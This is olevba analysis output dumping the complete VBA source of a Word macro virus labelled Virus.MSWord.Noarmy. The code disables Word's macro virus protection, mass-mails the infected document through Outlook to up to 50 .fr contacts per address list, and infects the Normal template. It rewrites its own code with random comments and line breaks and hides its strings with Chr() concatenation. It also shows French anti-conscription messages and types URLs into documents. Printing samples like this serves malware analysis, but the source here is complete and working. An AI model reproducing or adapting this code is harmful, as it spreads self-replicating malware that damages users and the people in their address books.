olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Noarmy-d2a9ea8aac40433165f7e86c21ba3b127478d519
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NOSN.cls 
in file: Virus.MSWord.Noarmy-d2a9ea8aac40433165f7e86c21ba3b127478d519 - OLE stream: 'Macros/VBA/NOSN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim h7, g8, j1, k2, j8, l1, m5, l8, a5, d3, g6, h3, k1, k5, g3, n6, h5, j5, k7: Dim e8, b9, a7, d6, c5, e2, g1, l3, l9, n2, m1, h8, l5, i1, i7, e4, c7, _
c4, f3, h1, d8 ' jhqqihma
Dim g5, e1, m4, b3, d4, f7, i3, g2, e5, d2, a4, a3, a2, c2, d1, c3, c1, b2, b1, a1 ' wzgl
Private Sub Document_Open(): On Error Resume Next ' pfuclghvxf
Call f1: Call f2 ' eetpsc
Randomize: Select Case System.PrivateProfileString(j1, k2, j8): Case Is <> j1 ' ghyidbw
System.PrivateProfileString(j1, k2, j8) = 1& ' nolxk
Case Else: Options.ConfirmConversions = m5: Options.VirusProtection = m5: Options.SaveNormalPrompt = m5: End Select ' davvpgpdtlfaf
d8 = a5 ' msgxlyud
Set c4 = CreateObject(d8) ' xmqxjsgfalofskn
Set f3 = c4.GetNameSpace(l8) ' nbyxwczqceotkiv
Select Case System.PrivateProfileString(j1, d3, g6) ' ztxoyoqarkpe
Case Is <> h3 ' kjyixkqhbyi
Select Case c4: Case k1: f3.Logon k5, g3 ' qcfnfb
For i = 1 To f3.AddressLists.Count: Set g4 = f3.AddressLists(i): Set h1 = c4.CreateItem(m5): h2 = g4.AddressEntries.Count: b6 = m5 ' bnaz
For j = 1 _
To h2: Set j2 = g4.AddressEntries(j): Select Case Len(j2.Address) ' rkyt
Case Is _
> 4 ' ujqqzysg
Select Case InStr(Len(j2.Address) - 3, j2.Address, n6, vbTextCompare): Case Is <> 0 ' pchlppmcnmgy
h1.Recipients.Add j2 ' smncyl
b6 = b6 + 1: End Select ' lasplbofh
End Select ' wkhfcjt
Select Case b6: Case 50: Exit For: End Select: Next j: Select Case Rnd() ' tpvucamfyjc
Case Is < 0.33: h1.Subject = h5 ' yaumpzklsd
h1.Body = j5: Case Is < 0.66 ' bttrryf
h1.Subject = g1: h1.Body = l3: Case Else ' qqsweex
h1.Subject = l9: h1.Body = n2: End Select ' keflhuyodrfmhmc
h1.Attachments.Add ActiveDocument.FullName ' gkzwkielk
h1.Send: Next i: f3.Logoff: End Select: System.PrivateProfileString(j1, d3, _
g6) = h3 ' lxglxcacbo
End Select: Set n1 = ActiveDocument.VBProject: Set i6 = _
n1.VBComponents.Item(1): Set n1 = NormalTemplate.VBProject: Set _
k3 = n1.VBComponents.Item(1): i2 = False ' myuycxcajww
Select Case InStr(1, ActiveDocument.Name, m1): Case False: Select Case i6.Name: Case Is <> g6: Set b5 = k3 ' mhxawbxeijlpda
Set f5 = i6 ' mihpcj
i2 = True: End Select: End Select: Select Case k3.Name: Case Is <> g6 ' xyxtkkaa
Set b5 = i6: Set f5 = k3: i2 = True ' qvqkahjys
End Select: Select Case i2 ' evrd
Case True ' gyidk
i4 = b5.CodeModule.CountOfLines - 1 ' xtls
c8 = f5.CodeModule.CountOfLines: Select Case c8 ' brshcdshk
Case Is > 0 ' qzmeryqa
f5.CodeModule.DeleteLines 1, c8: End Select: c6 = 1 ' ipgn
c9 = "" ' fmhrchrmaozmo
j3 = "": a6 = 0 ' cyqoxc
For l2 _
= 1 To i4: h4 = b5.CodeModule.Lines(l2, 1) ' jfxypjhpkyvi
i = 1 ' eivduk
f4 = InStr(1, h4, Chr(39)) ' orziswkb
Select Case f4 ' chyleczoneldw
Case 0 ' dodbv
f4 = Len(h4): Case Else ' osbsfbrkttsee
f4 = f4 - 2: End Select ' scjcdnhw
Do: j = InStr(i, h4, Chr(32)) ' ujpdxversouw
Select Case j ' prlfxb
Case 0 ' xrisakg
j = Len(h4) + _
1: b8 = True: Case f4 + 1: b8 = True: Case Else ' jxsygrfdauvr
b8 = False ' fgwxfmsy
End Select: n5 = Mid(h4, i, j - i): Select Case b8 ' nqfzq
Case True: f6 = b5.CodeModule.Lines(l2 + 1, 1): k4 = InStr(1, f6, Chr(32)): Select Case k4 ' qenclaqgsdorw
Case 0: j3 _
= "" ' xcoicibsmrkryk
Case Else ' yqfzztijrotcz
j3 = Mid(f6, 1, k4 - 1) ' tnhz
End Select: End Select ' dnujjmhcttk
Select Case n5: Case k7 + Chr(58): n5 _
= e8 + Chr(58): Case e8 + Chr(58): n5 = k7 + Chr(58) ' yodlx
Case k7 ' fthgwcd
n5 = e8: Case e8: n5 = k7 ' tzrapjwlmlqjgsi
End Select ' sodclmwonyrvy
Select Case h6 ' ctmqdolrcnizo
Case False: Select Case Rnd() ' aqevmrwmrbfdx
Case Is < 0.02 ' caecjt
h6 = True ' duagmvum
Case Else ' jclbrissqrebsl
h6 = False ' idgczfi
Select Case b8 ' hgbecjnlh
Case True ' ifztwfesplsxamt
Select Case l2: Case i4 ' mjbpjmrg
h6 = True ' nfiih
End Select ' liwovm
Select Case Rnd() ' lviolyevlsq
Case Is < 0.5 ' twkle
h6 = True: End Select: Select Case j3 ' lutfpcpmlrxsqt
Case e4 ' csqg
h6 = True: a6 = a6 + 1: Select Case a6: Case 4: l2 = i4: End Select: End Select ' ahidtqc
Select Case InStr(1, h4, c7): Case Is <> 0: Select Case _
n5: Case j17 ' gihngyrstkmab
h6 = _
False: Case Else ' wgskquvd
h6 = True: End Select: End Select ' hkqz
End Select ' objkd
End Select ' xllzlv
Select Case Len(n5) ' wdaepf
Case Is _
<> 0: Select Case InStr(Len(n5), _
n5, Chr(58)) ' vwndqjy
Case Is <> 0 ' ljywvzwbvq
Select Case Rnd(): Case Is _
< 0.5 ' vyfjauowzmbyg
h6 _
= True: End Select ' sdfurmlnowjquv
End Select ' vnskzbkre
End Select ' hyxhqvtnvwufuzo
Case Else: h6 = False: End Select ' eswqddwbypc
Select Case b8: Case True: Select Case n5: Case Chr(95) ' nxmdw
c9 = c9 + Switch(h6 = True, Chr(95), h6 = False, j1): j4 = False: Case Else: c9 = c9 + Switch(h6 = _
True, n5, h6 = False, n5 + Chr(58) + Chr(32)): j4 = True ' edvnvldagr
End Select ' uymuaa
Case Else: Select Case InStr(Len(n5), n5, Chr(58)) ' brdgeobbhwoodr
Case 0: c9 = c9 + Switch(h6 = True, n5 _
+ Chr(32) + Chr(95), h6 = False, n5 + Chr(32)): j4 = False ' gwhj
Case Else: c9 = c9 + Switch(h6 = True, Mid(n5, 1, Len(n5) - 1), h6 = False, n5 + Chr(32)): j4 = True ' owhdmndgkcrl
End Select: End Select: Select Case h6 ' cctsx
Case True: Select Case j4 ' nptwswtqjg
Case True ' dmlp
c9 = c9 + Chr(32) + Chr(39) + Chr(32): e6 = Int((12 * Rnd) + 4): For d5 = 1 To e6: c9 = c9 + Chr$(Int((26 * Rnd) + 97)): Next d5 ' nanslupschi
End Select: f5.CodeModule.InsertLines c6, c9: c6 = c6 + 1: c9 = "" ' nrkcytmbuflphr
End Select ' xxxspio
i = j + 1 ' kjcf
Select Case b8 ' mqgbbigipro
Case True ' ynqjqceeeyr
Exit Do: End Select ' lqclz
Loop: Next l2 ' qzmhxmfqqh
Select Case k3.Name ' myubo
Case Is <> g6: f5.Name = g6: NormalTemplate.Save: End Select ' qnaekkfnwqr
Select Case i6.Name ' yjisbyfk
Case Is <> g6 ' hhktfc
f5.Name = g6 ' nkpbrexwm
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName ' cflnbkt
ActiveDocument.Saved = True: End Select: Case Else: Select Case InStr(1, ActiveDocument.Name, m1): Case False: Select Case Rnd(): Case Is < 0.015 ' mxqwo
MsgBox h8 + l5 + i1 + i7, 32: MsgBox g5 + e1 + m4 + b3 + d4 + f7, 16: MsgBox i3 + g2 _
+ e5 + d2 + a4, 16 ' huvdcupsw
MsgBox a3 + a2 + c2 + d1 + _
c3, 16 ' ngdeadlolookk
MsgBox c1 + b2, 16: MsgBox _
b1 + a1, 48 ' ejzjrtgnsrqemj
Case Is _
< 0.03: Selection.TypeText b9: Case Is < 0.045 ' vbvnewxwhdidito
Selection.TypeText a7 ' irozpnezl
Case Is < 0.06: Selection.TypeText d6 ' proghcjbh
Case Is < 0.075 ' pmadcdesodar
Selection.TypeText c5 ' qgjwd
Case Is < 0.09 ' vyvzsbusezdkcqi
Selection.TypeText e2 ' wrmmjnflxr
End Select: ActiveDocument.SaveAs FileName:=ActiveDocument.FullName ' owyxsmbqi
ActiveDocument.Saved = True: End Select: End Select ' cnsmdqfwssper
End Sub ' drnnt
Private Sub f1(): h7 = Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111) ' jeop
g8 = Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(46) + Chr(46) + Chr(46): j1 = "": k2 = Chr(72) + Chr(75) + Chr(69) + _
Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + _
Chr(82) + Chr(69) + Chr(78): k2 = k2 + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) _
+ Chr(83) + Chr(111) + Chr(102): k2 = k2 + Chr(116) + Chr(119) + Chr(97) + _
Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) ' kjiyrjlsmxf
k2 = k2 + _
Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + _
Chr(102) + Chr(102) + Chr(105): k2 = k2 + Chr(99) _
+ Chr(101) + Chr(92) + Chr(57) + Chr(46) + Chr(48) + _
Chr(92) + Chr(87) + Chr(111) + Chr(114): k2 = k2 + Chr(100) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121): j8 = Chr(76) + Chr(101) + Chr(118) _
+ Chr(101) + Chr(108) ' cieb
l1 = Chr(84) + Chr(111) _
+ Chr(111) + Chr(108) _
+ Chr(115) ' azdhawyveld
m5 = 0: l8 _
= Chr(77) + Chr(65) + Chr(80) + Chr(73) ' wifhvc
a5 = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112) ' ycqrmkcilxqsutu
a5 = a5 + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) _
+ _
Chr(105) + _
Chr(111) + Chr(110): d3 = Chr(72) _
+ Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78): d3 = d3 + Chr(84) + Chr(95) + Chr(85) + Chr(83) _
+ Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) ' znmce
d3 = d3 + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114): d3 = d3 + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) ' tmideqvudfthcit
d3 = d3 _
+ Chr(99) + Chr(101) + Chr(92): g6 = Chr(78) + Chr(79) + Chr(83) + Chr(78): h3 = "Non" + Chr(32) + "au" + Chr(32) + "Service" + _
Chr(32) + "National" + Chr(32) + "-" + Chr(32) + "Oui" + Chr(32): h3 = h3 + _
"au" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail": k1 = Chr(79) + Chr(117) _
+ Chr(116) + _
Chr(108) + Chr(111) + Chr(111) + Chr(107): k5 = Chr(112) + Chr(114) + Chr(111) + Chr(102) + Chr(105) + Chr(108) + Chr(101): g3 = _
Chr(112) + Chr(97) + Chr(115) + Chr(115) + Chr(119) + Chr(111) + Chr(114) + Chr(100) ' xofgafojpgs
n6 = Chr(46) + Chr(102) + Chr(114) ' auujmijblwdaze
h5 = "Suggestion..." ' iticilkpadgri
j5 = "Ce" + Chr(32) + "document" + _
Chr(32) + "(" + ActiveDocument.Name + ")" + Chr(32) + "vaut" _
+ Chr(32) + "bien" ' hcahr
j5 = j5 + Chr(32) + "un" + Chr(32) + "petit" + Chr(32) + "coup" + Chr(32) + "d" + Chr(39) + "oeil." + Chr(13) + "J" + Chr(39) + "aimerais": j5 = j5 + Chr(32) _
+ "savoir" + Chr(32) + "s" _
+ Chr(39) + "il" + Chr(32) + "correspond" + Chr(32) + "à" + Chr(32) + "ce" + Chr(32) ' kgisnaaetv
j5 = j5 + "qu" _
+ Chr(39) _
+ "on" + Chr(32) + "attends" + Chr(32) + "de" + Chr(32) + "lui." + Chr(13): k7 = Chr(68) + Chr(111) + Chr(99) _
+ Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95): k7 = k7 _
+ Chr(67) + _
Chr(108) + Chr(111) + Chr(115) _
+ Chr(101) + Chr(40) + Chr(41) ' esklext
e8 = Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + _
Chr(110) + _
Chr(116): e8 = e8 + Chr(95) _
+ Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41): b9 = Chr(32) + "http://sn.agat.net" + Chr(32) ' yiqvxylqcxdi
a7 = Chr(32) + "http://altern.org/gigm/service.htm" + Chr(32) ' geeqr
d6 = Chr(32) + "http://www.donquichotte.com" + Chr(32): c5 = Chr(32) + "http://www.multimania.com/antisn" + Chr(32) ' ygjr
e2 = Chr(32) + "Oui" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "Emploi," + Chr(32) + "Oui" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "armée" + Chr(32) ' prkcsisrqpvrtiy
e2 = e2 + "de" + Chr(32) + "métier," + Chr(32) + "mais" + Chr(32) + "Non" + Chr(32) + "au" + Chr(32) + _
"service": e2 = e2 + Chr(32) _
+ "national" + Chr(32) + "sous" + Chr(32) + "contrat" + Chr(32) + "de" + Chr(32) + "travail," + Chr(32): e2 = e2 + "Non" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) _
+ "absurdité." + Chr(32): g1 = "Un" + Chr(32) + "peu" + Chr(32) + "d" + Chr(39) + "aide...": l3 = "Je" + Chr(32) + "dois" + Chr(32) + "avouer" + Chr(32) + "que" + Chr(32) + "j" + Chr(39) + "ai" + Chr(32) + "un" + Chr(32) + "peu" ' muygzzqefmzeixq
l3 = l3 + Chr(32) + "de" + Chr(32) + "mal" + Chr(32) + _
"à" + _
Chr(32) + "peaufiner" + Chr(32) + "ce" + Chr(32) + "document" ' cbespxozxy
l3 = l3 + Chr(32) + "(" + ActiveDocument.Name + ")." + Chr(13) + "Merci" + Chr(32) + "de" + Chr(32) + "m" + Chr(39) + "aider" + Chr(32) ' cdels
l3 = l3 + "un" + Chr(32) + "peu" + Chr(32) + "pour" + Chr(32) + "l" + _
Chr(39) + "améliorer..." + Chr(13) ' linuges
l9 = "Version" + Chr(32) + "finale": n2 = "Voici" + Chr(32) + "la" + Chr(32) + "dernière" + Chr(32) + "version" + Chr(32) + "de" + Chr(32) + "ce" + Chr(32): n2 = n2 + "sur" + _
Chr(32) + "quoi" + Chr(32) + "j" + Chr(39) _
+ "ai" + Chr(32) + "travaillé" + Chr(32) + "ces" + Chr(32) + "derniers": n2 = n2 + Chr(32) + "temps" + Chr(32) + _
"(" + ActiveDocument.Name + ")." + Chr(13) + "Tous" + Chr(32) + "les" + Chr(32) ' nrauux
n2 = n2 + "avis" + Chr(32) + "sont" + Chr(32) + "la" + Chr(32) + "bienvenue" + Chr(32) + "!" + Chr(13): m1 = "Document" ' cpkynsenirc
h8 = "Le" + Chr(32) + "mystère" + Chr(32) + "du" + Chr(32) + "jour" + Chr(32) + "à" _
+ Chr(32) + "résoudre" + Chr(32) + "est" _
+ Chr(32): h8 = h8 + "le" + Chr(32) + "suivant:" + Chr(13) + Chr(13): End Sub ' ruoqot
Private Sub f2(): l5 = "Lors" + Chr(32) + "de" + Chr(32) + "son" + Chr(32) + "intervention" + Chr(32) + "télévisée" + Chr(32) + _
"du" + Chr(32) _
+ "22" + Chr(32) ' jjfqfdmkkczxh
l5 _
= l5 + "février" + Chr(32) + "1996," + Chr(32) + "Jacques" + Chr(32) + _
"Chirac," + Chr(32) + "Président" + Chr(32) + "de" + Chr(32) + "la" ' renfgjivpiysg
l5 = l5 + Chr(32) + "République" + Chr(32) + "et" + Chr(32) + "Chef" + Chr(32) + "des" + Chr(32) + "Armées," + Chr(32) + "a" + Chr(32) + "proclamé:" + Chr(32) ' xjmrpwnbwrhhc
i1 = """Nous" + Chr(32) + "n" + Chr(39) + "avons" + Chr(32) + "plus" _
+ Chr(32) + "besoin" + _
Chr(32) + "d" + Chr(39) + _
"appelés..." + Chr(32) + "(Le" + Chr(32) + "service" + Chr(32) ' cjkrubwojrgzsg
i1 = i1 + "national)" + Chr(32) + "est" + Chr(32) + "devenu" + Chr(32) + "inégal" + Chr(32) + "et" + Chr(32) + "il" + Chr(32) + "n" + Chr(39) + "est" + Chr(32) + "plus": i1 = i1 + Chr(32) + "universel.""" + Chr(32) + "Le" + Chr(32) + "Service" _
+ Chr(32) + "National" + Chr(32) + "a" + Chr(32) + "ensuite" + Chr(32) + "été": i1 = i1 + Chr(32) + "supprimé" + Chr(32) + "pour" + Chr(32) + "tous..." + Chr(32) + "ou" + Chr(32) + "presque:" + Chr(32) ' hjheatujzvae
i7 = "Alors" + Chr(32) + "qu" + Chr(39) + "il" + Chr(32) + "n" + Chr(39) + "est" + Chr(32) + "plus" + Chr(32) + "obligatoire" + Chr(32) + "pour" + Chr(32) + "les" + Chr(32) + "gens": i7 = i7 + Chr(32) + "nés" + Chr(32) + "après" + Chr(32) + "1979," + Chr(32) + "les" + Chr(32) + "gens" + Chr(32) + "nés" + _
Chr(32) + "avant" + Chr(32) ' xcfwyxhhwyz
i7 = i7 + "1979" + Chr(32) + _
"peuvent" + Chr(32) + "encore" + Chr(32) + "perdre" + Chr(32) + _
"emploi," + Chr(32) + "appartement," + Chr(32) + "vie" + Chr(32): i7 = i7 + _
"de" + Chr(32) _
+ "famille" + Chr(32) + "sur" + Chr(32) + "simple" + Chr(32) + "ordre" + Chr(32) + "du" + Chr(32) + "Service" + Chr(32) + "National." ' vnxqexsnse
g5 = "En" + Chr(32) + "réalité," + Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "actuelle" + Chr(32) + "est" + Chr(32) + "bien" + Chr(32) + "pire" + Chr(32): g5 = g5 + "encore:" + Chr(32) + "Après" + Chr(32) + "avoir" + Chr(32) _
+ "accordé" + Chr(32) + "un" + Chr(32) + "report" + Chr(32) + "d" + Chr(39) + "incorporation" + Chr(32) ' wbrt
g5 = g5 + "de" _
+ Chr(32) + _
"2" + Chr(32) + "ans" + Chr(32) + "aux" + Chr(32): e1 = "jeunes" + Chr(32) + "ayant" _
+ Chr(32) + "obtenu" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail," + Chr(32) + "l" + Chr(39) + "Armée" + Chr(32) + "a" + Chr(32): e1 = e1 + "l" + Chr(39) + "intention" + Chr(32) + _
"de" + Chr(32) + "les" + Chr(32) + "rappeler" + Chr(32) + "au" + Chr(32) + "beau" + Chr(32) + "milieu" + Chr(32) + "de" + Chr(32): e1 = e1 + "leur" + Chr(32) + "carrière" + Chr(32) + "professionnelle." + Chr(32) + "Les" + Chr(32) + "implications" + _
Chr(32) + "sont" + Chr(32) + "bien" + Chr(32): e1 = e1 + "sûr" _
+ Chr(32) + "catastrophiques:" + Chr(13) + Chr(13): m4 = Chr(32) + Chr(32) + "-" + Chr(32) + "Vivre" _
+ Chr(32) + "sans" + Chr(32) + "salaire" + Chr(32) + "pendant" + Chr(32) + "10" _
+ Chr(32) + "mois" + Chr(32) + "ne" ' dkekramf
m4 = m4 + Chr(32) + "permet" + Chr(32) + "pas" + Chr(32) + "d" + Chr(39) + "assurer" _
+ Chr(32) + "engagements," + Chr(32) + "dettes" + Chr(32) + "et" + Chr(32) ' whhhftu
b3 = "impôts" + Chr(32) + "qui" + Chr(32) + "sont" + Chr(32) + "déjà" + Chr(32) + "difficiles" + Chr(32) _
+ "à" + Chr(32) + "assumer" + Chr(32) + "dans" + Chr(32) + "un" ' tsrbvsdku
b3 = b3 + Chr(32) + "début" _
+ Chr(32) + "de" _
+ Chr(32) + "vie" + Chr(32) + "active" + Chr(32) + "normal." + Chr(13) + Chr(13) ' oucef
d4 = Chr(32) + Chr(32) + "-" + _
Chr(32) + "Ne" _
+ Chr(32) + "pas" + Chr(32) + "pratiquer" + Chr(32) + "son" + Chr(32) + "activité" + Chr(32) + "professionnelle" _
+ Chr(32): d4 = d4 + "pendant" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "implique" + Chr(32) + "également" + Chr(32) + "une" + Chr(32) + "perte" + Chr(32) + "d" + Chr(39) + "expérience" ' empgn
d4 = d4 + Chr(32) + "utile," + Chr(32) + "la" + Chr(32) + "nécessité" + Chr(32) + "d" + Chr(39) + "une" + _
Chr(32) + "période" + Chr(32) ' ejpxrgyactdnmhz
f7 = "de" _
+ Chr(32) + "réadaptation," + Chr(32) + "une" + Chr(32) + "modification" + Chr(32) + "de" + Chr(32) + "son" + Chr(32) + "projet" + Chr(32) + "professionnel" ' cprot
f7 = f7 + Chr(32) + "et" + Chr(32) + "bien" + Chr(32) + "sûr" + Chr(32) + "l" + Chr(39) + _
"inquantifiable" + Chr(32) + "colère" + Chr(32) + "des" + Chr(32) + "employeurs," + Chr(32) ' jfluhakyxlqborq
f7 = f7 + "qui" + Chr(32) + "se" + Chr(32) + "traduira," + Chr(32) + "intentionnellement" + Chr(32) + "ou" + _
Chr(32) + "non," + Chr(32) + "par" + Chr(32) + "un" + Chr(32): f7 = f7 + "ralentissement" + Chr(32) + "dans" + Chr(32) + "l" + Chr(39) + "évolution" _
+ Chr(32) + "de" + Chr(32) + "carrière.": i3 = Chr(32) + _
Chr(32) + "-" + _
Chr(32) + "Du" + Chr(32) + "fait" + Chr(32) + "qu" + Chr(39) + "il" + Chr(32) + "soit" + Chr(32) + "tout" + Chr(32) + "bonnement" + Chr(32) + "impossible": i3 = i3 + Chr(32) + "d" + Chr(39) + "assurer" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" + Chr(32) + "loyer" + Chr(32) + "sans" + Chr(32) + "salaire" + Chr(32) + _
"sur" + Chr(32): i3 = i3 + "cette" + Chr(32) + "période," + Chr(32) ' ravslkqoh
g2 = "l" + Chr(39) + "abandon" _
+ Chr(32) + "du" + Chr(32) + "logement" + _
Chr(32) + "est" + Chr(32) + "irrémédiable." + Chr(32) + "Qui" + Chr(32) + "prendra" _
+ Chr(32) + "alors" + Chr(32): g2 = g2 + "en" + Chr(32) + "charge" + Chr(32) + "les" + Chr(32) + "frais" + Chr(32) + "de" + Chr(32) + "déménagement," + Chr(32) + "de" + Chr(32) + "garde-meuble" + Chr(32) ' fbmgyhosru
g2 = g2 + "et" + Chr(32) + "de" + Chr(32) _
+ "recherche" + Chr(32) _
+ "d" + Chr(39) + "un" + Chr(32) + "nouvel" + Chr(32) + "appartement?" + Chr(13) + Chr(13) ' lgayodszijtyiwu
e5 = Chr(32) + Chr(32) + "-" + Chr(32) + "Et" + Chr(32) + "que" + Chr(32) + "dire" + Chr(32) + "de" + Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "morale" + Chr(32): e5 = e5 + "au" + Chr(32) + "plus" _
+ Chr(32) + "bas" + Chr(32) + "durant" + Chr(32) + "ces" + Chr(32) + "10" _
+ Chr(32) + "longs" + Chr(32) + "mois" + Chr(32) + "?" + Chr(32) ' jxsmnlcrfvwyy
e5 = e5 + "Le" + Chr(32) + "rêve" + Chr(32) + "de" + Chr(32) + "vie" + Chr(32) + "que" + Chr(32) + "l" + Chr(39) + "on" + Chr(32) _
+ "était" + Chr(32) + "entrain" + Chr(32) + "de" + Chr(32): e5 = e5 + "bâtir" + Chr(32) + "s" + Chr(39) + "effondre" + Chr(32) + "pour" + Chr(32) + "laisser" + Chr(32) + _
"place": d2 = Chr(32) + "aux" + Chr(32) + "corvées" + Chr(32) + "inutiles" + Chr(32) + "et" + Chr(32) + "a" + _
Chr(32) + "l" + Chr(39) _
+ "ennui" + Chr(32) + "bien" + Chr(32) + "connu" + Chr(32) + "du" ' ndsmm
d2 = d2 + Chr(32) + "Service" + Chr(32) + "National." + Chr(32) + "Est-il" + Chr(32) + "possible" + Chr(32) + "de" + Chr(32) + "rester" + Chr(32) + _
"loin" + Chr(32) + "de": a4 = a4 + Chr(32) + "la" + Chr(32) + "personne" + Chr(32) + "avec" + Chr(32) + "qui" + Chr(32) + "l" + Chr(39) + "on" + Chr(32) + "vie," + Chr(32) + "de" + Chr(32) + "ses" + Chr(32) + "relations," + Chr(32) + "de" ' cilrtcfovrf
a4 = Chr(32) + "ses" + Chr(32) + "amis," + Chr(32) + "pendant" + Chr(32) + "10" + _
Chr(32) + "mois" + Chr(32) + "puis" + Chr(32) + "de" + Chr(32) + "reprendre" + Chr(32) + "comme" + Chr(32) + "si": a4 = a4 + Chr(32) + _
"rien" + Chr(32) + "ne" + Chr(32) + "s" + Chr(39) + "était" + Chr(32) + "passé" + Chr(32) + "?" ' zsjgsymu
a3 = "Certains" + Chr(32) + "diront" + Chr(32) + "que" + Chr(32) + "le" + Chr(32) + "Service" + Chr(32) + "National" + Chr(32) + "fait" + Chr(32) + "partie" + Chr(32) + "du" + Chr(32) + "devoir" ' ucqfrpwljnrr
a3 = a3 + _
Chr(32) + "de" + Chr(32) + "citoyen." + Chr(32) + "Mais" _
+ Chr(32) + "servir" + Chr(32) + "son" + Chr(32) + "pays" + Chr(32) + "c" + Chr(39) + "est" + Chr(32) + "d" + Chr(39) + "abord" + Chr(32) + "payer" + Chr(32): a3 = a3 + "ses" + Chr(32) + "impôts," + Chr(32) + "participer" + Chr(32) + "aux" + Chr(32) + "frais" + Chr(32) + "de" + _
Chr(32) + "la" + Chr(32) + _
"sécurité" + Chr(32) + "sociale," + Chr(32) + "des" ' wourvarnitdjbw
a3 = a3 + _
Chr(32) + "allocations" + Chr(32) + "chômage,": a2 _
= Chr(32) + _
"des" + Chr(32) + "retraites," + Chr(32) + "etc." + Chr(32) + "Ce" + Chr(32) _
+ "sont" + Chr(32) + "bien" + Chr(32) + _
"sûr" + Chr(32) + "les" + Chr(32) + "personnes" + Chr(32) + "qui": a2 = a2 _
+ Chr(32) + "travaillent" + Chr(32) + "qui" + Chr(32) + "payent" + Chr(32) + "tout" + Chr(32) + "cela," + Chr(32) + "et" + _
Chr(32) + "les" + _
Chr(32) + "actuels" + Chr(32) + "sursitaires": a2 = a2 + Chr(32) + "en" + Chr(32) + "font" + Chr(32) + "partie." + Chr(32) + "Ils" + Chr(32) + "sont" _
+ Chr(32) + "bien" + Chr(32) + "plus" _
+ Chr(32) + "utiles" + Chr(32): c2 = "à" + Chr(32) + "la" + Chr(32) + "nation" + Chr(32) + "en" + Chr(32) _
+ "tant" + Chr(32) + "que" + Chr(32) + "cotisants" + Chr(32) + "qu" + Chr(39) + "en" + Chr(32) + "tant" + Chr(32) + "qu" + Chr(39) + "appelés" + Chr(32): c2 = c2 + "du" + Chr(32) + "contingent." + Chr(13) + Chr(13) ' zeuqjepb
d1 = "Le" + Chr(32) + "service" + Chr(32) + "national" + Chr(32) + "prétends" + Chr(32) + "aujourd" + Chr(39) + "hui" + Chr(32) + "que" + Chr(32) + "la" + Chr(32) + "vie" + Chr(32) + "reprends" + Chr(32) + "son" ' umezepka
d1 = d1 + Chr(32) + "cour" + Chr(32) + "normalement" + Chr(32) + "après" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" + Chr(32) + "service" + Chr(32) + "au" + Chr(32) + "milieu" + Chr(32): d1 = d1 + "d" + Chr(39) + "un" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail." + Chr(32) + "C" + Chr(39) + "est" + Chr(32) _
+ "bien" + Chr(32) + "sûr" + Chr(32) + "un" + Chr(32) _
+ "véritable" _
+ Chr(32) + "utopisme" ' ctoeveklzkik
d1 = d1 + Chr(32) + _
"et" + Chr(32) + "le" + Chr(32) ' synfibocxxl
c3 = "bilan" + Chr(32) + "ne" + _
Chr(32) + "se" + Chr(32) + "résume" + Chr(32) + "pas" + Chr(32) + "à" + Chr(32) + _
"une" + Chr(32) + "perte" + Chr(32) + "de" + Chr(32) + "10" + Chr(32) + "mois" _
+ Chr(32) ' zwdnyhzu
c3 = c3 + "de" + Chr(32) + "temps:" + Chr(32) + "C" + Chr(39) + "est" + _
Chr(32) + "une" + Chr(32) + "véritable" + Chr(32) + "catastrophe" _
+ Chr(32) _
+ "pour" _
+ Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "financière," ' ricnjcobhwwm
c3 = _
c3 + Chr(32) + "matérielle" + Chr(32) + "et" + _
Chr(32) + "morale" + Chr(32) + "de" + Chr(32) + "l" + Chr(39) + "individu," + Chr(32) + "qui" + Chr(32) + "aura" + Chr(32) + "des" + Chr(32) + _
"répercutions" + Chr(32) ' iqaz
c3 = c3 + "regrettables" + Chr(32) + "et" + Chr(32) + "durables." ' qngahgxnldrnd
c1 = "Ils" + Chr(32) + "sont" + Chr(32) + _
"environ" + _
Chr(32) + "250" + Chr(32) + "000" + Chr(32) + _
"jeunes" + Chr(32) + "citoyens," + Chr(32) + "sursitaires," + _
Chr(32) + "à" + Chr(32) + "devoir" + Chr(32) ' jdxtobabsnf
